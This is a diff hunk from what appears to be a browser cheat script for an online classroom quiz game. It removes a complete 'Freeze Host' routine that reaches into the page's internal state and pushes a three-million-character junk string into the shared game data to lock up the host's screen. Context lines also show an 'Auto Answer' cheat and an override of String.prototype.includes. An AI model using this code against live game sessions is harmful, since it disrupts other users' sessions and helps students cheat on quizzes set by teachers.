@@ -1106,29 +1106,6 @@ String.prototype.includes = function(a){if(a == "#" && this.length > 30){
                       });
                   }
               }, {
-                  name: "Freeze Host",
-                  description: "Freezes the host's screen",
-                  run: function() {
-                      var chars = ["\u202E", "\u4FFF", "\u4F52", "\u2F9F", "\u0E47", "\u0E47", "\u0E47", "\u0E47", "\u0E47", "\u0E47", "\u4FF1", "\u4FF2"];
-
-                      function makeLongText() {
-                          return new Array(3e+6).fill().map(e => chars[Math.floor(Math.random() * chars.length)]).join("");
-                      }
-
-                      let {
-                          props: t
-                      } = Object.values(function e(t = document.querySelector("body>div")) {
-                          return Object.values(t)[1]?.children?.[0]?._owner.stateNode ? t : e(t.querySelector(":scope>div"));
-                      }())[1].children[0]._owner.stateNode;
-
-                      let repeatedText = makeLongText();
-                      t.client.blook = repeatedText;
-                      t.liveGameController.setVal({
-                          path: `c/${t.client.name}/b`,
-                          val: repeatedText
-                      });
-                  }
-              }, {
             name: "Auto Answer",
             description: "Click the correct answer for you",
             run: function() {
